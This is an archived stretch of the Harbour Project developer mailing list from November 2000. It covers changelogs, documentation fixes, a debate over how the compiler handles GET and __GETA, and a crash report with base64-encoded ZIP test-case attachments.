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

--Message-Boundary-17497--

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 15:58:02 2000
Date: Thu Nov  2 15:58:02 2000
From: Luiz Rafael Culik Guimaraes harbour@lists.harbour-project.org
Subject: [Harbour] testbrw.prg Compiler error!!

<PRE>Ron.

I´ll fix the TestBrw.prg since it was I who broked

Regards

Luiz Rafael Culik



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 16:03:02 2000
Date: Thu Nov  2 16:03:02 2000
From: Luiz Rafael Culik Guimaraes harbour@lists.harbour-project.org
Subject: [Harbour] Re: CHANGELOG 2000-11-02 00:10 GMT -3 (Luiz)

<PRE>Chen


&gt;<i> Luiz,
</I>&gt;<i> 
</I>&gt;<i> (I think you forgot to send the CHANGELOG notifcation to the list)
</I>Sure. you write. my connection this night was bad.
 
&gt;<i> 1. doc/en/tbrowse.txt - could you please add CVS ID
</I>&gt;<i> 2. doc/en/rddord.txt  - there are 5 lines at the top of this
</I>&gt;<i>                         document which looks a bit redundant
</I>&gt;<i> 3. doc/en/garbage.txt - change // into /* */ in CVS header
</I>&gt;<i> 4. doc/en/idle.txt    - change // into /* */ in CVS header
</I>
No problem

Regards

Luiz Rafael Culik


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 16:11:02 2000
Date: Thu Nov  2 16:11:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (Ryszard)

<PRE>Ryszard,

Just to make my point clearer, the application of this logic will be &quot;hard
coded&quot;, no matter whether it is in the Parser, or in the Expression
Optimizer. Either way it is still a &quot;hard coded&quot;/&quot;mangling&quot; which converts
_GET_(...) to either __GET(...) or __GETA(...).

I did change the rules to not make any assumptions regarding the number and
type of the parameters, and it now supports extended parameters.

Please note that in the case of __GETA(), Clipper *overrides* the 6th
parameter with an array of the Index Expressions and so does my fix.

I also found that Clipper truncates the Variable Name (2nd parameter of
__GETA()) so that it only has the Base Array Name excluding the [...] (Array
Index). Therefore ReadVar() will report the name of the Base Array and thus
the reason for TGet:SubScript.

I did correct my fix to do the same.

Ron

&gt;<i> Ryszard,
</I>&gt;<i>
</I>&gt;<i> That's the way it is done in Clipper! Clipper does _not_ provide same for
</I>&gt;<i> macros!
</I>&gt;<i>
</I>&gt;<i> Try the following in Clipper:
</I>&gt;<i>
</I>&gt;<i> //------ Test.prg ----------//
</I>&gt;<i> FUNCTION Main()
</I>&gt;<i>
</I>&gt;<i>    LOCAL Macro := &quot;aArray[M-&gt;Counter]&quot;
</I>&gt;<i>
</I>&gt;<i>    PRIVATE aArray := { &quot;Macro&quot; }, Counter := 1
</I>&gt;<i>
</I>&gt;<i>    CLEAR SCREEN
</I>&gt;<i>
</I>&gt;<i>    @ 06,10 GET &amp;Macro
</I>&gt;<i>
</I>&gt;<i>    M-&gt;Counter := 3
</I>&gt;<i>
</I>&gt;<i>    READ
</I>&gt;<i>
</I>&gt;<i> RETURN NIL
</I>&gt;<i> //------ EOF Test.prg ----------//
</I>&gt;<i>
</I>&gt;<i> Finally, regardless of _where_ you do it, you will have to *assume* the
</I>&gt;<i> number of parameters and their type for __GET(...) and __GETA(...)! What
</I>&gt;<i> will be difference if you move my logic into the Expression Optimizer?.
</I>&gt;<i>
</I>&gt;<i> Either way, to remain 100% compatible we shouldn't perform this &quot;mangling&quot;
</I>&gt;<i> in macro expressions. So I don't think there is any benefit in moving this
</I>&gt;<i> logic to the Expression Optimizer (where it will be &quot;hidden&quot;,
</I>&gt;<i> i.e. far less
</I>&gt;<i> obvious).
</I>&gt;<i>
</I>&gt;<i> At this point we are 100% compatible with Clipper (here). IAE, no need to
</I>&gt;<i> discuss it any further, feel free to implement it any way wish, I
</I>&gt;<i> don't have
</I>&gt;<i> time to argue this issue.
</I>&gt;<i>
</I>&gt;<i> Ron
</I>&gt;<i>
</I>&gt;<i> &gt; &gt; Please review rules I added for GET in harbour.sly, I have
</I>&gt;<i> &gt; already done it
</I>&gt;<i> &gt; &gt; practically the same way you describe. If we all approve, I'll
</I>&gt;<i> &gt; try to copy
</I>&gt;<i> &gt; &gt; same into harbour.y next week.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;   I disagree. You have hard coded the syntax of _GET_ into the syntax
</I>&gt;<i> &gt; parser (both the number of parameters and their type). This will limit
</I>&gt;<i> &gt; the possibility to extend the functionality of __GET and __GETA in
</I>&gt;<i> &gt; custom code. Such expression mangling is a job for the expression
</I>&gt;<i> &gt; optimizer. Notice also that this will allow to reuse the same code for
</I>&gt;<i> &gt; macro compilation.  The expression optimizer will just check if a called
</I>&gt;<i> &gt; function is _GET_ and will replace the first expression with the more
</I>&gt;<i> &gt; complex expression. We can even replace a[i,j] with { a, i,j } that will
</I>&gt;<i> &gt; leave the number of parameters unchanged.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Regards, Ryszard
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 17:58:01 2000
Date: Thu Nov  2 17:58:01 2000
From: Luiz Rafael Culik Guimaraes harbour@lists.harbour-project.org
Subject: [Harbour] Changelogs

<PRE>2000-11-02 19:20 GMT -3 Luiz Rafael Culik &lt;<A HREF="mailto:culik@sl.conex.net">culik@sl.conex.net</A>&gt;
   *doc/en/tbrowse.txt
     *added missing CVS ID
   *doc/en/terminal.txt
     *Fixed typo on MAXROW() doc
   *doc/en/rddord.txt
      *Removed 5 dumb lines
   *doc/en/idle.txt
    doc/en/garbage.txt
      *Changes // coments to /* */
   *utils/hbdoc/rtf.prg
    utils/hbdoc/genrtf.prg
    utils/hbdoc/hbdoc.prg
     *Small Changes   
    *utils/hbdoc/genrtf.prg
     utils/hbdoc/genrtf.prg
     *Small Fix to work with $CLASSDOC$ style headers
   *tests/testbrw.prg
    *small fixes

2000-11-02 00:10 GMT -3 Luiz Rafael Culik &lt;<A HREF="mailto:culik@sl.conex.net">culik@sl.conex.net</A>&gt;
   *doc/en/tbrowse.txt
     *Small changes
   *doc/en/terminal.txt
     +Row(),COL(),PROW(),PCOL() documentes
   *doc/en/rddord.txt
      *small changes
   *doc/en/rddmisc.txt
      *Fixed an typo on AFields Doc
   *doc/en/rddsdb.txt
      *Small fix on dbCreate() doc
   *utils/hbdoc/rtf.prg
    utils/hbdoc/genrtf.prg
    utils/hbdoc/hbdoc.prg
     *Small Changes   


Regards from Brazil

Luiz Rafael Culik


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 18:25:03 2000
Date: Thu Nov  2 18:25:03 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-02 15:20 UTC+0800 Ron Pinkas <ron@profit-master.com>

<PRE>2000-11-02 15:20 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
   * source/compiler/harbour.sly
     + Added support for extended parameters to __GET() and __GETA()
     ! Corrected 2nd parameter of __GETA() to reflect only the Base Array
Name.

   * source/rtl/tget.prg
     ! Added support for :SubScript in __GETA()

   * include/hbextern.ch
     - Removed _GET_
     + Added __GETA


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 18:44:02 2000
Date: Thu Nov  2 18:44:02 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] Re: dynsym.c caused GPF

<PRE>Questo è un messaggio a più sezioni in formato MIME.
--------------0AA573C5883198BD3BA1DE1E
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: 8bit

Hi Jean,

I think you not only oversimplified (removing tmysqlserver all together)
but you changed the way objects are created. That is, for example, you
added SelezionaQuery(Self) inside TSQLEditor:New() this is a _huge_
change and it dies of a different error if called this way but it is now
able to create TScegliQuery object.

Since building tmysql.prg is probably your biggest problem I've changed
it to remove every call from mysql.c so it can compile as it is.

I've added it here with the other files changed back to what they were
and need to be to cause a GPF. This time there is only .prg files
involved.

Here it dies now with:

Exception c0000005 at address 4b679
Called from TCLASS:CREATE(166)
Called from TBROWSESQL(145)
Called from __CLSINSTSUPER(0)
Called from TCLASS:CREATE(166)
Called from TSCEGLIQUERY(19)
Called from SELEZIONAQUERY(156)
Called from TSQLEDITOR:KEYBOARDHOOK(123)
Called from TSQLEDITOR:EDIT(896)
Called from MAIN(64)

Process terminated by SIGSEGV
core dumped
SYS1808:
Il processo è terminato. Il codice per la diagnostica
software (codice dell'errore) è  0005.


Please put all these files in a subdir and inside a makefile, compile
everything then issue a:


farmaq -d test

and then press key

F3

it should be all that you need to kill it.

Thanks a lot for your patience and your efforts.

Maurilio.

PS. Files inside tcase1.zip have their original path, remove it when
unzipping.
 

JF Lefebvre ha scritto:
&gt;<i> 
</I>&gt;<i> Maurilio,
</I>&gt;<i> 
</I>&gt;<i> I can't reproduce your problem here :-((((
</I>&gt;<i> 
</I>&gt;<i> Perhaps, it's my fault, It is possible I have so simplified your
</I>&gt;<i> program it does'nt GPF anymore.
</I>&gt;<i> 
</I>&gt;<i> Could you please try to compile the 3 files within test.zip attached
</I>&gt;<i> and let me know if it GPF or no.
</I>&gt;<i> 
</I>&gt;<i> I think I have the same inheritence you had.
</I>&gt;<i> 
</I>&gt;<i> _Take_CARE_!!!! the name of the files within test.zip will collide
</I>&gt;<i> with yours !!!! farmaq.prg, tfarmaq.prg and tsqlbrw.prg !!!!!!!!
</I>&gt;<i> 
</I>&gt;<i> Please try it and let me know the result.
</I>&gt;<i> 
</I>&gt;<i> Best regards,
</I>&gt;<i> 
</I>&gt;<i> J. Lefebvre,
</I>&gt;<i> Bruxelles,
</I>&gt;<i> Belgium
</I>&gt;<i> 
</I>&gt;<i>   ------------------------------------------------------------------------
</I>&gt;<i> The following section of this message contains a file attachment
</I>&gt;<i> prepared for transmission using the Internet MIME message format.
</I>&gt;<i> If you are using Pegasus Mail, or any another MIME-compliant system,
</I>&gt;<i> you should be able to save it or view it from within your mailer.
</I>&gt;<i> If you cannot, please ask your system administrator for assistance.
</I>&gt;<i> 
</I>&gt;<i>    ---- File information -----------
</I>&gt;<i>      File:  Test.zip
</I>&gt;<i>      Date:  2 Nov 2000, 21:31
</I>&gt;<i>      Size:  6031 bytes.
</I>&gt;<i>      Type:  ZIP-archive
</I>&gt;<i> 
</I>&gt;<i>   ------------------------------------------------------------------------
</I>&gt;<i>                Name: Test.zip
</I>&gt;<i>    Test.zip    Type: Zip Compressed Data (application/x-zip-compressed)
</I>&gt;<i>            Encoding: BASE64
</I>
-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>--------------0AA573C5883198BD3BA1DE1E
Content-Type: application/x-zip-compressed;
 name=&quot;tcase1.zip&quot;
Content-Transfer-Encoding: base64
Content-Disposition: inline;
 filename=&quot;tcase1.zip&quot;

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
